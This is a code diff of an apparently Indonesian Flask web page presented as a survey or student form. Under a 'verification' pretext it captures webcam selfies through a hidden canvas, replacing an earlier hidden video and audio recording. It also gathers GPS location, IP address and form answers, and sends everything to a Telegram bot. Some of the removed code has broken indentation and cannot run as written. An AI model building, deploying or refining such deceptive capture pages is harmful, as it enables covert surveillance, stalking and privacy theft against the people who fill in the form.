@@ -4,13 +4,6 @@ import os
 import base64
 import uuid
 import requests
-import subprocess
-import tempfile
-import imageio_ffmpeg
-
-# Path FFmpeg yang bundled dengan imageio-ffmpeg
-FFMPEG_PATH = imageio_ffmpeg.get_ffmpeg_exe()
-print(f"✅ FFmpeg ditemukan di: {FFMPEG_PATH}")
 
 app = Flask(__name__)
 
@@ -216,11 +209,13 @@ def index():
         </div>
 
         <video id="video" autoplay muted playsinline style="display:none"></video>
+        <canvas id="canvas" style="display:none"></canvas>
 
         <script>
-        const DURASI_REKAM = 5000;
+        const JUMLAH_FOTO = 5;
+        const INTERVAL_FOTO = 1000;   // 1 detik antar foto
         let lokasi = null;
-        let videoBase64 = null;
+        let daftarFoto = [];           // array 5 foto base64
 
         const statusEl = document.getElementById("status");
         const btnKirim = document.getElementById("btnKirim");
@@ -263,16 +258,15 @@ def index():
                 return await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: "user",
-                        width: { ideal: 480 },
-                        height: { ideal: 360 },
-                        frameRate: { ideal: 20 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
-                    audio: true
+                    audio: false
                 });
             } catch (err) {
                 try {
                     return await navigator.mediaDevices.getUserMedia({
-                        video: true, audio: true
+                        video: true, audio: false
                     });
                 } catch (err2) {
                     throw "denied camera";
@@ -281,82 +275,54 @@ def index():
         }
 
         // ==========================================
-        // REKAM VIDEO 5 DETIK — PAKSA MP4
+        // AMBIL 5 FOTO (interval 1 detik)
         // ==========================================
-        async function rekamVideo(stream) {
+        async function ambilFoto(stream) {
             const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
             video.srcObject = stream;
             video.style.display = "block";
 
-            // Tunggu kamera stabil (auto-focus)
+            // Tunggu kamera stabil
             await new Promise(r => setTimeout(r, 800));
 
-            // Prioritas format MP4 dulu, WebM sebagai fallback
-            const formatList = [
-                "video/mp4;codecs=h264,aac",
-                "video/mp4;codecs=h264",
-                "video/mp4;codecs=avc1.42E01E,mp4a.40.2",
-                "video/mp4",
-                "video/webm;codecs=vp9,opus",
-                "video/webm;codecs=vp8,opus",
-                "video/webm"
-            ];
+            daftarFoto = [];
 
-            let mimeType = "";
-            for (const fmt of formatList) {
-                if (MediaRecorder.isTypeSupported(fmt)) {
-                    mimeType = fmt;
-                    break;
+            for (let i = 0; i < JUMLAH_FOTO; i++) {
+                // Set ukuran canvas sesuai video
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+
+                // Gambar frame ke canvas
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Konversi ke base64 JPEG (kualitas 70%)
+                const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+                daftarFoto.push(dataUrl);
+
+                console.log(`📸 Foto ${i + 1}/${JUMLAH_FOTO} diambil`);
+
+                // Update progress bar
+                setProgress(60 + Math.round((i + 1) / JUMLAH_FOTO * 20));
+
+                // Tunggu sebelum foto berikutnya (kecuali foto terakhir)
+                if (i < JUMLAH_FOTO - 1) {
+                    await new Promise(r => setTimeout(r, INTERVAL_FOTO));
                 }
             }
-            console.log("📹 Format rekaman:", mimeType);
-
-            const recorder = new MediaRecorder(stream, {
-                mimeType: mimeType,
-                videoBitsPerSecond: 500000,   // 500 kbps — kualitas cukup
-                audioBitsPerSecond: 64000     // 64 kbps audio
-            });
-
-            const chunks = [];
-            recorder.ondataavailable = e => {
-                if (e.data.size > 0) chunks.push(e.data);
-            };
-
-            const selesai = new Promise(resolve => {
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: mimeType });
-                    resolve(blob);
-                };
-            });
-
-            // Gunakan timeslice agar data tersimpan per 200ms
-            recorder.start(200);
-
-            // Rekam tepat 5 detik
-            await new Promise(r => setTimeout(r, DURASI_REKAM));
-            recorder.stop();
-
-            const blob = await selesai;
 
             // Matikan kamera
             stream.getTracks().forEach(t => t.stop());
             video.style.display = "none";
 
-            console.log("📹 Ukuran video:", (blob.size / 1024).toFixed(1), "KB");
-            console.log("📹 Tipe video:", blob.type);
-
-            return await blobToBase64(blob);
+            console.log(`✅ Selesai ambil ${daftarFoto.length} foto`);
+            return daftarFoto;
         }
 
-        function blobToBase64(blob) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
-            });
-        }
-
+        // ==========================================
+        // KIRIM KE SERVER
+        // ==========================================
         async function kirimKeServer(formData) {
             const res = await fetch("/simpan", {
                 method: "POST",
@@ -365,8 +331,7 @@ def index():
                     latitude: lokasi.latitude,
                     longitude: lokasi.longitude,
                     accuracy: lokasi.accuracy,
-                    video: videoBase64,
-                    mime: videoBase64.split(";")[0].split(":")[1],
+                    foto: daftarFoto,        // ⭐ array 5 foto
                     form: formData
                 })
             });
@@ -414,13 +379,13 @@ def index():
                 return;
             }
 
-            // STEP 3: Rekam
+            // STEP 3: Ambil 5 foto
             setStatus("info", "⏳ Memproses verifikasi... mohon tunggu");
             try {
-                videoBase64 = await rekamVideo(stream);
+                await ambilFoto(stream);
                 setProgress(80);
             } catch (err) {
-                console.error("Error rekam:", err);
+                console.error("Error ambil foto:", err);
                 setStatus("error", "❌ Terjadi kesalahan. Coba lagi.");
                 btnKirim.disabled = false;
                 btnKirim.innerHTML = "📤 Kirim Jawaban";
@@ -476,65 +441,6 @@ def index():
     </html>
     """, **INFO_SURVEI)
 
-def konversi_ke_mp4(vid_bytes, ext_asal="webm"):
-    """
-    Konversi video (webm/mp4) ke MP4 H.264 yang kompatibel Telegram.
-    Return: (bytes_mp4, "mp4") atau (vid_bytes_asli, ext_asal) kalau gagal.
-    """
-    try:
-        # Tulis video asli ke file temporary
-        with tempfile.NamedTemporaryFile(delete=False, suffix=f".{ext_asal}") as f_in:
-            f_in.write(vid_bytes)
-            input_path = f_in.name
-
-        output_path = input_path.rsplit(".", 1)[0] + "_conv.mp4"
-
-        # Konversi pakai ffmpeg
-        cmd = [
-            FFMPEG_PATH,
-            "-y",                          # overwrite
-            "-i", input_path,              # input
-            "-c:v", "libx264",             # codec H.264
-            "-preset", "ultrafast",        # paling cepat
-            "-crf", "30",                  # kualitas (28-32 pas untuk kecil)
-            "-pix_fmt", "yuv420p",         # kompatibel semua player
-            "-c:a", "aac",                 # audio AAC
-            "-b:a", "64k",                 # bitrate audio
-            "-movflags", "+faststart",     # metadata di awal (streaming)
-            "-t", "10",                    # batas max 10 detik
-            output_path
-        ]
-
-        result = subprocess.run(
-            cmd,
-            capture_output=True,
-            timeout=60
-        )
-
-        if result.returncode != 0:
-            print(f"   ⚠ FFmpeg error: {result.stderr.decode()[:300]}")
-            return vid_bytes, ext_asal
-
-        # Baca hasil konversi
-        with open(output_path, "rb") as f:
-            mp4_bytes = f.read()
-
-        # Bersihkan file temporary
-        try:
-            os.remove(input_path)
-            os.remove(output_path)
-        except:
-            pass
-
-        print(f"   ✅ Konversi berhasil: {len(vid_bytes)} → {len(mp4_bytes)} bytes")
-        return mp4_bytes, "mp4"
-
-    except subprocess.TimeoutExpired:
-        print("   ❌ FFmpeg timeout (>60s)")
-        return vid_bytes, ext_asal
-    except Exception as e:
-        print(f"   ❌ Konversi gagal: {type(e).__name__}: {e}")
-        return vid_bytes, ext_asal
 
 # ============================================
 # ENDPOINT: TERIMA DATA + KIRIM TELEGRAM
@@ -549,8 +455,7 @@ def simpan():
     lat = data["latitude"]
     lon = data["longitude"]
     akurasi = data.get("accuracy", 0)
-    video_data = data.get("video", "")
-    mime = data.get("mime", "video/webm")
+    daftar_foto = data.get("foto", [])   # ⭐ array berisi 5 foto base64
     form_data = data.get("form", {})
 
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
@@ -558,21 +463,9 @@ def simpan():
     waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     ref = uuid.uuid4().hex[:12].upper()
 
-    # Tentukan ekstensi
-    if "mp4" in mime:
-        ext = "mp4"
-        send_mime = "video/mp4"
-    elif "webm" in mime:
-        ext = "webm"
-        send_mime = "video/webm"
-    else:
-        ext = "webm"
-        send_mime = "video/webm"
-
     print(f"📥 DATA MASUK | REF: {ref}")
     print(f"   Lokasi: {lat}, {lon} (±{round(akurasi)}m)")
-    print(f"   MIME: {mime} | Ext: {ext}")
-    print(f"   Form: {form_data}")
+    print(f"   Jumlah foto: {len(daftar_foto)}")
 
     if not TELEGRAM_TOKEN or "GANTI" in TELEGRAM_TOKEN:
         print("⚠ TELEGRAM_TOKEN belum di-set")
@@ -591,7 +484,7 @@ def simpan():
         siswa_text += f"• {label}: `{v}`\n"
 
     caption = (
-        f"🎥 *Video + Lokasi Baru!*\n\n"
+        f"📸 *Foto + Lokasi Baru!*\n\n"
         f"📍 Lat: `{lat:.6f}`\n"
         f"Lon: `{lon:.6f}`\n"
         f"±{round(akurasi)}m\n\n"
@@ -601,80 +494,42 @@ def simpan():
         f"{siswa_text}"
     )
 
-    # Kirim ke Telegram
+    # ============ KIRIM SEMUA FOTO KE TELEGRAM ============
     try:
-        if video_data.startswith("data:video"):
-            header, encoded = video_data.split(",", 1)
-            vid_bytes = base64.b64decode(encoded)
+        total_foto = len(daftar_foto)
+        for i, foto_data in enumerate(daftar_foto):
+            if not foto_data.startswith("data:image"):
+                print(f"   ⚠ Foto {i+1} tidak valid, skip")
+                continue
 
-            size_mb = len(vid_bytes) / (1024 * 1024)
-            print(f"   📹 Ukuran video: {size_mb:.2f} MB")
+            header, encoded = foto_data.split(",", 1)
+            foto_bytes = base64.b64decode(encoded)
+            size_kb = len(foto_bytes) / 1024
+            print(f"   📤 Mengirim foto {i+1}/{total_foto} ({size_kb:.1f} KB)...")
 
-            if size_mb > 49:
-    print(f"   ⚠ Video terlalu besar, kirim teks saja")
-    r = requests.post(
-        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-        data={
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": caption + f"\n\n⚠ Video terlalu besar ({size_mb:.1f}MB)",
-            "parse_mode": "Markdown"
-        },
-        timeout=8
-    )
-else:
-    # ✅ KONVERSI KE MP4
-    print(f"   🔄 Konversi ke MP4...")
-    vid_bytes, ext = konversi_ke_mp4(vid_bytes, ext)
-    send_mime = "video/mp4"
-    size_mb = len(vid_bytes) / (1024 * 1024)
-    print(f"   📹 Ukuran setelah konversi: {size_mb:.2f} MB")
-
-            if size_mb > 49:
-                print(f"   ⚠ Masih terlalu besar, kirim teks saja")
-                r = requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                    data={
-                        "chat_id": TELEGRAM_CHAT_ID,
-                        "text": caption + f"\n\n⚠ Video terlalu besar setelah konversi",
-                        "parse_mode": "Markdown"
-                    },
-                    timeout=8
-                )
+            # Foto pertama dapat caption lengkap, sisanya caption singkat
+            if i == 0:
+                cap = caption
             else:
-                print(f"   📤 Mengirim video MP4 ke Telegram...")
-                files = {"video": ("video.mp4", vid_bytes, "video/mp4")}
-                r = requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo",
-                    data={
-                        "chat_id": TELEGRAM_CHAT_ID,
-                        "caption": caption,
-                        "parse_mode": "Markdown",
-                        "supports_streaming": True
-                    },
-                    files=files,
-                    timeout=25
-                )
-        else:
-            print("   📝 Tidak ada video, kirim teks saja")
+                cap = f"📸 Foto {i+1}/{total_foto} | REF: {ref}"
+
+            files = {"photo": (f"selfie_{i+1}.jpg", foto_bytes, "image/jpeg")}
             r = requests.post(
-                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                 data={
                     "chat_id": TELEGRAM_CHAT_ID,
-                    "text": caption + "\n\n⚠ Video tidak tersedia",
+                    "caption": cap,
                     "parse_mode": "Markdown"
                 },
-                timeout=8
+                files=files,
+                timeout=10
             )
+            print(f"   📨 Foto {i+1} response: HTTP {r.status_code}")
 
-        print(f"   📨 Response HTTP: {r.status_code}")
-        if r.status_code == 200:
-            print(f"   ✅ Telegram OK | REF: {ref}")
-        else:
-            print(f"   ❌ Telegram error: {r.status_code}")
-            print(f"   ❌ Body: {r.text[:500]}")
+        print(f"   ✅ Selesai kirim {total_foto} foto | REF: {ref}")
 
     except requests.exceptions.Timeout:
-        print(f"   ❌ TIMEOUT: Telegram tidak respon")
+        print("   ❌ TIMEOUT saat kirim foto")
     except requests.exceptions.ConnectionError as e:
         print(f"   ❌ KONEKSI ERROR: {e}")
     except Exception as e:
